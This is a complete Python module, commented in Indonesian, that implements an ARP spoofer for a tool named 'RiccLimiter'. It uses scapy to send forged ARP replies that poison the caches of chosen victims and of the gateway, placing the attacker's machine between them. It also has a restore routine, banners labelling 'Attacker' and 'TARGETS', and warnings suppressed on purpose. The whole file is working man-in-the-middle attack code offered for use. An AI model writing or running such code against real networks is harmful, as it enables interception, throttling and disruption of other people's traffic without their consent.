#!/usr/bin/env python3
"""
ARP Spoofer untuk RiccLimiter
Dengan visual attack dan tanpa warning
"""

import time
import threading
from scapy.all import ARP, send, srp, conf
import netifaces as ni
import warnings
warnings.filterwarnings("ignore", category=SyntaxWarning)
warnings.filterwarnings("ignore", category=UserWarning)
warnings.filterwarnings("ignore", category=RuntimeWarning)

# Konfigurasi Scapy biar diem
conf.verb = 0

class ARPSpoofer:
    def __init__(self, interface=None):
        self.interface = interface
        self.gateway_ip = None
        self.gateway_mac = None
        self.my_ip = None
        self.my_mac = None
        self.running = False
        self.spoof_thread = None
        self.victims = []
        
    def get_network_info(self):
        """Dapatkan info jaringan (gateway, MAC sendiri)"""
        if not self.interface:
            return False
        try:
            addrs = ni.ifaddresses(self.interface)
            self.my_ip = addrs[ni.AF_INET][0]['addr']
            self.my_mac = addrs[ni.AF_LINK][0]['addr']
            
            gateways = ni.gateways()
            self.gateway_ip = gateways['default'][ni.AF_INET][0]
            
            # Dapatkan MAC gateway
            arp_request = ARP(pdst=self.gateway_ip)
            response = srp(arp_request, timeout=2, verbose=False)[0]
            if response:
                self.gateway_mac = response[0][1].hwsrc
                return True
        except:
            return False
        return False
    
    def arp_spoof(self, target_ip, target_mac):
        """Kirim ARP spoof ke target dan gateway"""
        # Poison target: gateway punya MAC attacker
        poison_target = ARP(
            op=2, 
            pdst=target_ip, 
            hwdst=target_mac, 
            psrc=self.gateway_ip,
            hwsrc=self.my_mac  # Tambahin ini biar warning ilang
        )
        
        # Poison gateway: target punya MAC attacker
        poison_gateway = ARP(
            op=2, 
            pdst=self.gateway_ip, 
            hwdst=self.gateway_mac, 
            psrc=target_ip,
            hwsrc=self.my_mac  # Tambahin ini biar warning ilang
        )
        
        send(poison_target, iface=self.interface, verbose=False)
        send(poison_gateway, iface=self.interface, verbose=False)
        
    def restore_arp(self, target_ip, target_mac):
        """Kembalikan ARP ke keadaan normal"""
        restore_target = ARP(
            op=2, 
            pdst=target_ip, 
            hwdst=target_mac, 
            psrc=self.gateway_ip, 
            hwsrc=self.gateway_mac
        )
        restore_gateway = ARP(
            op=2, 
            pdst=self.gateway_ip, 
            hwdst=self.gateway_mac, 
            psrc=target_ip, 
            hwsrc=target_mac
        )
        
        send(restore_target, iface=self.interface, count=3, verbose=False)
        send(restore_gateway, iface=self.interface, count=3, verbose=False)
        
    def start_spoofing(self, victims):
        """Mulai ARP spoofing dengan visual"""
        self.victims = victims
        self.running = True
        self.spoof_thread = threading.Thread(target=self._spoof_loop_with_visual)
        self.spoof_thread.daemon = True
        self.spoof_thread.start()
        
        # Tampilan awal
        print("\n" + "="*60)
        print("🔥 ARP SPOOFING ACTIVE 🔥".center(60))
        print("="*60)
        print(f"🎯 Gateway: {self.gateway_ip} [{self.gateway_mac[:8]}]")
        print(f"💻 Attacker: {self.my_ip} [{self.my_mac[:8]}]")
        print("-"*60)
        print("📡 TARGETS:")
        for v in victims:
            print(f"   ├─ {v['ip']} [{v['mac'][:8]}] - {v.get('hostname', 'Unknown')}")
        print("-"*60)
        print("[ Press Ctrl+C to stop ]")
        print("="*60)
        
    def _spoof_loop_with_visual(self):
        """Loop spoofing dengan tampilan real-time"""
        counter = 0
        while self.running:
            for victim in self.victims:
                self.arp_spoof(victim['ip'], victim['mac'])
                
                # Tampilan per target (biar keliatan hidup)
                counter += 1
                if counter % 10 == 0:
                    print(f"⚡ Spoofing {victim['ip']} ...", end='\r')
                    
            time.sleep(0.5)  # Lebih cepet dari 1 detik
            
    def stop_spoofing(self):
        """Stop spoofing dan restore ARP"""
        self.running = False
        if self.spoof_thread:
            self.spoof_thread.join(timeout=2)
            
        print("\n" + "="*60)
        print("🛑 STOPPING SPOOFING...".center(60))
        print("="*60)
        
        # Restore semua victim
        for victim in self.victims:
            self.restore_arp(victim['ip'], victim['mac'])
            print(f"↩️  Restored {victim['ip']}")
            
        print("✅ ARP spoofing stopped - Network restored")
        print("="*60 + "\n")
        
    def get_status(self):
        """Dapatkan status spoofing"""
        return {
            'running': self.running,
            'gateway': f"{self.gateway_ip} [{self.gateway_mac[:8]}]",
            'attacker': f"{self.my_ip} [{self.my_mac[:8]}]",
            'victims': len(self.victims),
            'targets': [f"{v['ip']} [{v['mac'][:8]}]" for v in self.victims]
        }


# Untuk testing
if __name__ == "__main__":
    spoofer = ARPSpoofer("wlan0")
    if spoofer.get_network_info():
        print(spoofer.get_status())
    else:
        print("Failed to get network info")
